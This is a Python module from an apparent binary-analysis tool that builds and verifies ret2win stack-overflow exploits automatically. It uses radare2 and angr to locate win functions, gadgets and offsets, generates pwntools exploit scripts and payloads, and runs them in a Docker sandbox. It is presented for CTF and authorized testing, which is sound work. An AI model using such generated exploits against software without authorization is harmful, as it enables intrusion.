"""Automatic PoC generation and verification (ret2win class).

For a binary with a gift/win function reachable through a stack overflow, this:
  1) finds the offset to the saved return address with angr (no execution needed),
  2) builds a concrete pwntools ret2win exploit (with a ret gadget for stack alignment),
  3) optionally RUNS it in an x86-64 Docker sandbox and confirms the objective.

This turns "reachability verified" into "exploit verified". For AUTHORIZED targets / CTF."""
from __future__ import annotations

import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from typing import List, Optional

try:
    import angr  # type: ignore
    import logging as _lg
    _lg.getLogger("angr").setLevel(_lg.ERROR)
    _lg.getLogger("cle").setLevel(_lg.ERROR)
    _lg.getLogger("pyvex").setLevel(_lg.ERROR)
    _HAVE_ANGR = True
except Exception:
    _HAVE_ANGR = False


@dataclass
class PoCResult:
    ok: bool
    stage: str
    offset: Optional[int] = None
    win: Optional[int] = None
    script: str = ""
    payload_hex: str = ""
    verified: bool = False
    run_output: str = ""
    notes: List[str] = field(default_factory=list)


def _r2(binary: str, cmd: str) -> str:
    exe = shutil.which("r2") or shutil.which("radare2")
    if not exe:
        return ""
    try:
        out = subprocess.run([exe, "-q", "-e", "scr.color=0", "-e", "log.quiet=true", "-2",
                              "-c", cmd, binary], capture_output=True, text=True, timeout=90)
        return out.stdout
    except subprocess.TimeoutExpired:
        return ""


def find_win(binary: str) -> Optional[int]:
    funcs = _r2(binary, "aa;afl")
    for line in funcs.splitlines():
        low = line.lower()
        if any(k in low for k in ("win", "shell", "backdoor", "flag", "give")):
            m = re.match(r"\s*(0x[0-9a-fA-F]+)", line)
            if m:
                return int(m.group(1), 16)
    return None


def find_ret_gadget(binary: str) -> Optional[int]:
    out = _r2(binary, "/R ret")
    for line in out.splitlines():
        m = re.match(r"\s*(0x[0-9a-fA-F]+)\s+c3\s+ret\b", line)
        if m:
            return int(m.group(1), 16)
    m = re.search(r"(0x[0-9a-fA-F]+)\s+c3\s+ret", out)
    return int(m.group(1), 16) if m else None


def find_pc_offset(binary: str, maxlen: int = 400) -> Optional[int]:
    """Find the offset from input to the saved return address, symbolically (no run)."""
    if not _HAVE_ANGR:
        return None
    try:
        proj = angr.Project(binary, auto_load_libs=False)
        state = proj.factory.entry_state()
        simgr = proj.factory.simulation_manager(state, save_unconstrained=True)
        steps = 0
        while simgr.active and not simgr.unconstrained and steps < 300:
            simgr.step()
            steps += 1
        if not simgr.unconstrained:
            return None
        u = simgr.unconstrained[0]
        pc_val = u.solver.eval(u.regs.pc)
        pc_bytes = pc_val.to_bytes(proj.arch.bytes, "little")
        inp = u.posix.dumps(0)
        off = inp.find(pc_bytes)
        return off if off >= 0 else None
    except Exception:
        return None


def build_script(binary: str, offset: int, win: int, ret: Optional[int]) -> str:
    align = f"    p64({hex(ret)}),  # ret gadget (stack alignment)\n" if ret else ""
    return f'''#!/usr/bin/env python3
# binoracle auto-PoC (ret2win) for an AUTHORIZED target
from pwn import *
context.binary = elf = ELF({binary!r})
io = process(elf.path)
payload = flat({{
    {offset}: [
{align}        p64({hex(win)}),  # win()
    ]
}})
io.sendline(payload)
io.interactive()
'''


def _docker_run(binary: str, payload: bytes) -> (bool, str):
    docker = shutil.which("docker")
    if not docker:
        return (False, "docker not available")
    d = os.path.dirname(os.path.abspath(binary))
    name = os.path.basename(binary)
    with open(os.path.join(d, ".poc_payload"), "wb") as f:
        f.write(payload + b"\n")
    try:
        out = subprocess.run(
            [docker, "run", "--rm", "--platform", "linux/amd64", "-v", d + ":/w", "-w", "/w",
             "gcc:13", "bash", "-c", f"chmod +x ./{name}; stdbuf -oL -eL ./{name} < .poc_payload 2>&1 | head -40"],
            capture_output=True, text=True, timeout=120)
        return (True, out.stdout + out.stderr)
    except subprocess.TimeoutExpired:
        return (True, "[timed out]")
    finally:
        try:
            os.unlink(os.path.join(d, ".poc_payload"))
        except OSError:
            pass


def autopoc(binary: str, offset: Optional[int] = None, run: bool = True) -> PoCResult:
    r = PoCResult(ok=False, stage="init")
    win = find_win(binary)
    if win is None:
        r.stage = "no-win"
        r.notes.append("no se encontro una funcion gift (win/shell/flag). ret2win no aplica; "
                       "prueba ROP/ret2libc.")
        return r
    r.win = win
    if offset is None:
        offset = find_pc_offset(binary)
    if offset is None:
        r.stage = "no-offset"
        r.notes.append("no se pudo determinar el offset automaticamente (angr). "
                       "Pasa --offset N (hallalo con cyclic).")
        r.win = win
        return r
    r.offset = offset
    ret = find_ret_gadget(binary)
    r.script = build_script(binary, offset, win, ret)

    # concrete payload bytes
    payload = b"A" * offset
    if ret:
        payload += ret.to_bytes(8, "little")
    payload += win.to_bytes(8, "little")
    r.payload_hex = payload.hex()
    r.ok = True
    r.stage = "built"

    if run:
        ran, output = _docker_run(binary, payload)
        r.run_output = output
        if ran:
            markers = ("win reached", "win()", "you win", "/bin/sh", "uid=", "$ ")
            if any(m in output.lower() for m in ("win reached", "you win", "win()")) or "uid=" in output:
                r.verified = True
                r.stage = "verified"
                r.notes.append("PoC ejecutado en sandbox: objetivo alcanzado (win).")
            else:
                r.notes.append("PoC ejecutado pero no se detecto el marcador de exito; revisa la salida.")
    return r


def render_poc(r: PoCResult, lang: str = "es") -> str:
    out = ["## Auto-PoC (ret2win)\n"]
    if not r.ok:
        out.append(f"No se pudo construir el PoC ({r.stage}).")
        out += [f"- {n}" for n in r.notes]
        return "\n".join(out)
    out.append(f"- win: `{hex(r.win)}`")
    out.append(f"- offset: `{r.offset}`")
    out.append(f"- verificado en sandbox: **{'SI' if r.verified else 'no'}**")
    if r.notes:
        out += [f"- {n}" for n in r.notes]
    out.append("\n### payload\n```\npayload = bytes.fromhex('" + r.payload_hex + "')\n```")
    out.append("### exploit pwntools\n```python\n" + r.script + "```")
    if r.run_output:
        out.append("### salida de la ejecucion en sandbox\n```\n" + r.run_output.strip()[:1500] + "\n```")
    return "\n".join(out)
